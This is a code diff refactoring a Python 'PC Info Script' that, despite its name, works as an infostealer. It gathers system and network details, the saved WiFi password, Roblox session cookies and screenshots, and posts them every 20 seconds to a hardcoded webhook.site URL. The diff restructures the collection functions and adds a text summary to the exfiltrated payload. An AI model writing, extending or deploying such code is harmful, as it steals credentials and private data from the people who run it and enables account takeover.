@@ -1,4 +1,4 @@
-!/usr/bin/env python3
+#!/usr/bin/env python3
 """PC Info Script (minimal dependencies, standard library only)
 
 Features:
@@ -61,7 +61,7 @@ from typing import Dict, List, Tuple, Optional, Any
 # CONFIG
 # -----------------
 WEBHOOK_SITE_URL = "https://webhook.site/f17e6915-aca9-40d8-afde-79214a48718b"
-SCRIPT_VERSION = "3.0.0"
+SCRIPT_VERSION = "3.1.0"
 INTERVAL_SECONDS = 20
 
 
@@ -724,8 +724,9 @@ def take_screenshot_simple() -> Optional[str]:
 # OUTPUT
 # -----------------
 
-def build_dict() -> Dict:
-    """Builds a dictionary with all system information."""
+def collect_snapshot() -> Dict[str, Any]:
+    """Aggregates all system information in a structured dictionary."""
+
     os_info = get_os_info()
     user_info = get_user_info()
     cpu_info = get_cpu_info()
@@ -736,22 +737,21 @@ def build_dict() -> Dict:
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     wifi = get_wifi_info()
     wifi_password = get_wifi_password(wifi["ssid"])
-    uptime_text = format_duration(get_uptime_seconds())
+    uptime_seconds = get_uptime_seconds()
     battery = get_battery_info()
     interfaces = get_network_interfaces()
     public_ip, public_country = get_public_ip_with_country()
-    
-    storage_list = []
-    for path, free, total in storage_entries:
-        storage_list.append({"path": path, "free": free, "total": total})
-    
-    roblox_cookies_lines = read_roblox_cookies()
-    
+
+    storage_list = [
+        {"path": path, "free": free, "total": total} for path, free, total in storage_entries
+    ]
+
     return {
         "timestamp": timestamp,
         "version": SCRIPT_VERSION,
         "system": os_info,
-        "uptime": uptime_text,
+        "uptime_seconds": uptime_seconds,
+        "uptime_text": format_duration(uptime_seconds),
         "user": user_info,
         "cpu": cpu_info,
         "ram": {"total": total_ram, "free": free_ram},
@@ -772,96 +772,140 @@ def build_dict() -> Dict:
             "ssid": wifi["ssid"],
             "password": wifi_password,
         },
-        "roblox_cookies": roblox_cookies_lines,
+        "roblox_cookies": read_roblox_cookies(),
     }
 
 
-def build_lines() -> List[str]:
-    os_info = get_os_info()
-    user_info = get_user_info()
-    cpu_info = get_cpu_info()
-    total_ram, free_ram = get_ram_info()
-    storage_entries = get_storage_info()
-    gateway = get_default_gateway()
-    dns_servers = get_dns_servers()
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    wifi = get_wifi_info()
-    wifi_password = get_wifi_password(wifi["ssid"])
-    uptime_text = format_duration(get_uptime_seconds())
-    battery = get_battery_info()
-    interfaces = get_network_interfaces()
-    public_ip, public_country = get_public_ip_with_country()
-    lines: List[str] = [
-        "System:",
-        f"  OS: {os_info['name']}",
-        f"  Version: {os_info['version']}",
-        f"  Architektur: {os_info['arch']}",
-        "",
-        "Uptime:",
-        f"  {uptime_text}",
-        "",
-        "Benutzer:",
-        f"  Username: {user_info['username']}",
-        f"  Home: {user_info['home']}",
-        "",
-        "CPU:",
-        f"  Kerne (logisch): {cpu_info['cores']}",
-        f"  Architektur: {cpu_info['arch']}",
-        "",
-        "Arbeitsspeicher:",
-        f"  Gesamt: {total_ram}",
-        f"  Frei: {free_ram}",
-        "",
-        "Akku:",
-        f"  Status: {battery['status']}",
-        f"  Prozent: {battery['percent']}",
-        "",
-        "Speicher:",
-    ]
+def build_dict() -> Dict[str, Any]:
+    """Keeps compatibility: returns the collected snapshot."""
 
-    if storage_entries:
-        for path, free, total in storage_entries:
-            lines.append(f"  {path}  Frei: {free} / {total}")
+    return collect_snapshot()
+
+
+def _add_section(lines: List[str], header: str, content: List[str]) -> None:
+    lines.append(header)
+    if content:
+        lines.extend([f"  {line}" for line in content])
     else:
         lines.append("  (keine Daten)")
-
-    lines.extend([
-        "",
-        "Netzwerk:",
-        f"  Gateway: {gateway}",
-        "DNS:",
-    ])
-
-    for dns in dns_servers:
-        lines.append(f"  - {dns}")
-
     lines.append("")
-    lines.append("Netzwerk-Interfaces:")
-    if interfaces:
-        for name in interfaces:
-            lines.append(f"  - {name}")
-    else:
+
+
+def build_lines(snapshot: Optional[Dict[str, Any]] = None) -> List[str]:
+    """Builds formatted text lines for console/file/webhook output."""
+
+    data = snapshot or collect_snapshot()
+    lines: List[str] = []
+
+    _add_section(
+        lines,
+        "System:",
+        [
+            f"OS: {data['system']['name']}",
+            f"Version: {data['system']['version']}",
+            f"Architektur: {data['system']['arch']}",
+        ],
+    )
+
+    _add_section(lines, "Uptime:", [data.get("uptime_text", "unbekannt")])
+
+    lines.append(f"PC-Name (Hostname): {data['network']['hostname']}")
+    lines.append("")
+
+    _add_section(
+        lines,
+        "Benutzer:",
+        [
+            f"Username: {data['user']['username']}",
+            f"Home: {data['user']['home']}",
+        ],
+    )
+
+    _add_section(
+        lines,
+        "CPU:",
+        [
+            f"Kerne (logisch): {data['cpu']['cores']}",
+            f"Architektur: {data['cpu']['arch']}",
+        ],
+    )
+
+    _add_section(
+        lines,
+        "Arbeitsspeicher:",
+        [
+            f"Gesamt: {data['ram']['total']}",
+            f"Frei: {data['ram']['free']}",
+        ],
+    )
+
+    _add_section(
+        lines,
+        "Akku:",
+        [
+            f"Status: {data['battery']['status']}",
+            f"Prozent: {data['battery']['percent']}",
+        ],
+    )
+
+    storage_lines = [
+        f"{entry['path']}  Frei: {entry['free']} / {entry['total']}"
+        for entry in data.get("storage", [])
+    ]
+    _add_section(lines, "Speicher:", storage_lines)
+
+    _add_section(
+        lines,
+        "Netzwerk:",
+        [
+            f"PC-Name: {data['network']['hostname']}",
+            f"Gateway: {data['network']['gateway']}",
+            f"Private IP: {data['network']['private_ip']}",
+            f"Public IP: {data['network']['public_ip']} ({data['network']['public_country']})",
+            f"MAC-Adresse: {data['network']['mac_address']}",
+        ],
+    )
+
+    _add_section(
+        lines,
+        "DNS:",
+        [f"- {dns}" for dns in data['network'].get("dns_servers", [])],
+    )
+
+    _add_section(
+        lines,
+        "Netzwerk-Interfaces:",
+        [f"- {name}" for name in data['network'].get("interfaces", [])],
+    )
+
+    _add_section(
+        lines,
+        "Zeit:",
+        [data.get("timestamp", "unbekannt")],
+    )
+
+    _add_section(
+        lines,
+        "Script:",
+        [f"Version: {data.get('version', 'unbekannt')}"]
+        + ([f"Uptime (Sekunden): {data['uptime_seconds']}"] if data.get("uptime_seconds") else []),
+    )
+
+    _add_section(
+        lines,
+        "WLAN:",
+        [
+            f"Interface: {data['wifi']['interface']}",
+            f"SSID: {data['wifi']['ssid']}",
+            f"Passwort: {data['wifi']['password']}",
+        ],
+    )
+
+    lines.extend(data.get("roblox_cookies", []))
+    if not data.get("roblox_cookies"):
+        lines.append("Roblox-Cookies:")
         lines.append("  (keine Daten)")
 
-    lines.extend([
-        "",
-        "Zeit:",
-        f"  {timestamp}",
-        "",
-        "Script:",
-        f"  Version: {SCRIPT_VERSION}",
-        "",
-        f"PC-Name (Hostname): {get_hostname()}",
-        f"Private IP: {get_private_ip()}",
-        f"Public IP: {public_ip} ({public_country})",
-        f"MAC-Adresse: {get_mac_address()}",
-        "WLAN:",
-        f"  Interface: {wifi['interface']}",
-        f"  SSID: {wifi['ssid']}",
-        f"  Passwort: {wifi_password}",
-        "",
-    ])
-    lines.extend(read_roblox_cookies())
     return lines
 
 
@@ -885,6 +929,7 @@ def send_text_to_webhook(url: str, lines: List[str]) -> None:
 def send_data_with_screenshot(url: str, data_dict: Dict, screenshot_b64: Optional[str] = None) -> None:
     """Sends data dictionary and optional screenshot to webhook as JSON."""
     payload = data_dict.copy()
+    payload["text_summary"] = "\n".join(build_lines(data_dict))
     if screenshot_b64:
         payload["screenshot"] = screenshot_b64
         payload["screenshot_format"] = "bmp_base64"  # We're encoding BMP format
@@ -917,8 +962,8 @@ def main() -> int:
             timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             print(f"\n[{timestamp}] Zyklus #{cycle} - Sammle Daten...")
             
-            # Build data
-            data_dict = build_dict()
+            # Build data snapshot once per cycle for consistent text/JSON
+            data_dict = collect_snapshot()
             
             # Take screenshot
             print("  -> Erstelle Screenshot...")
@@ -941,7 +986,7 @@ def main() -> int:
             # Save to file (first cycle only)
             if cycle == 1:
                 try:
-                    lines = build_lines()
+                    lines = build_lines(data_dict)
                     save_txt(lines)
                     print("  -> Gespeichert in pc_info.txt")
                 except OSError as e:
